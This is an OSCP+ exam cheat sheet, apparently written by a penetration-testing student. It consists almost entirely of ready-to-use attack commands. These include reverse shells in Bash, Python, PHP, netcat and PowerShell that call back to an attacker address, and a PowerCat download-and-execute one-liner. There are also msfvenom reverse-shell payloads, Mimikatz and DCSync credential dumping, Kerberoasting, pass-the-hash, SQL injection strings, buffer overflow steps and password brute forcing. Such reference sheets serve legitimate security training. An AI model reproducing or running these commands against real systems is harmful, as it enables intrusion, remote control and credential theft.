# OSCP+ Cheat Sheet

**Author:** r0tn3x  
**Quick Reference for Exam Day**

---

## 🎯 Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("10.10.14.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/sh 10.10.14.10 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerCat
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.10/powercat.ps1');powercat -c 10.10.14.10 -p 4444 -e powershell"
```

### Upgrade Shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 🔍 Nmap Quick Commands

```bash
# Quick scan
nmap -p- -T4 --min-rate=1000 10.10.10.10

# Full scan
nmap -p- -sC -sV -A 10.10.10.10 -oN nmap.txt

# UDP top 100
sudo nmap -sU --top-ports=100 10.10.10.10

# Vuln scan
nmap --script=vuln -p 80,443 10.10.10.10
```

---

## 🌐 Web Fuzzing

```bash
# gobuster
gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt

# feroxbuster
feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt

# ffuf
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403
```

---

## 🐧 Linux Privilege Escalation

### Enumeration

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l
find / -perm -4000 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
ps aux | grep root
netstat -tulpn
```

### SUID Exploitation

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# GTFOBins - check each binary
https://gtfobins.github.io/
```

### Sudo Exploitation

```bash
sudo -l

# Sudo version exploit
sudo -V
searchsploit sudo
```

### Cronjobs

```bash
cat /etc/crontab
ls -la /etc/cron*
pspy64 # Monitor processes
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

---

## 🪟 Windows Privilege Escalation

### Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# Manual checks
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
tasklist /v
netstat -ano
```

### SeImpersonatePrivilege

```powershell
# PrintSpoofer
.\PrintSpoofer.exe -i -c cmd

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# If both = 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Unquoted Service Paths

```powershell
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Weak Service Permissions

```cmd
# Check service permissions
icacls "C:\Program Files\service.exe"

# Replace with payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe -o service.exe
```

### Registry Autoruns

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

---

## 🏢 Active Directory

### Enumeration

```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer

# BloodHound
.\SharpHound.exe -c all
```

### Kerberoasting

```bash
# Request TGS
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 domain.com/user:password

# Crack
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting

```bash
impacket-GetNPUsers domain.com/ -dc-ip 10.10.10.10 -request -format hashcat

# Crack
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash

```bash
impacket-psexec -hashes :ntlmhash administrator@10.10.10.10
evil-winrm -i 10.10.10.10 -u administrator -H ntlmhash
```

### DCSync

```bash
impacket-secretsdump domain.com/administrator:password@10.10.10.10
```

### Mimikatz

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::dcsync /user:Administrator
```

---

## 📁 File Transfer

### Linux

```bash
# Python HTTP Server
python3 -m http.server 80

# Download
wget http://10.10.14.10/file
curl http://10.10.14.10/file -o file
```

### Windows

```powershell
# PowerShell download
IWR -Uri http://10.10.14.10/file -OutFile file
(New-Object Net.WebClient).DownloadFile('http://10.10.14.10/file','C:\file')

# Certutil
certutil -urlcache -f http://10.10.14.10/file file

# SMB
impacket-smbserver share . -smb2support
copy \\10.10.14.10\share\file C:\file
```

---

## 💉 SQL Injection

```sql
# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT version(),user(),database()--

# Error-based
' AND 1=CONVERT(int,(SELECT @@version))--

# Blind
' AND SLEEP(5)--
' AND 1=1--
' AND 1=2--

# sqlmap
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs
sqlmap -u "http://10.10.10.10/page.php?id=1" -D database --tables
sqlmap -u "http://10.10.10.10/page.php?id=1" -D database -T users --dump
```

---

## 📝 Buffer Overflow (Windows)

```python
# Pattern create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138

# Bad chars
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
)

# Find JMP ESP
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -b "\x00\x0a\x0d" -f python
```

---

## 🔑 Password Attacks

```bash
# Hydra SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# Hydra HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🎯 Exam Tips

1. **Enumerate thoroughly** - Don't rush
2. **Take breaks** - Every 2 hours
3. **Document everything** - Screenshots, commands
4. **Try harder** - Reset box if stuck
5. **Read carefully** - Exam instructions
6. **Backup shells** - Multiple methods
7. **Check kernel version** - Linux privesc
8. **Check privileges** - Windows privesc
9. **Test exploits locally** - Before running
10. **Stay calm** - You got this!

---

**More Resources:** See [resources.md](resources.md)

**Author:** r0tn3x | OSCP+ December 2025
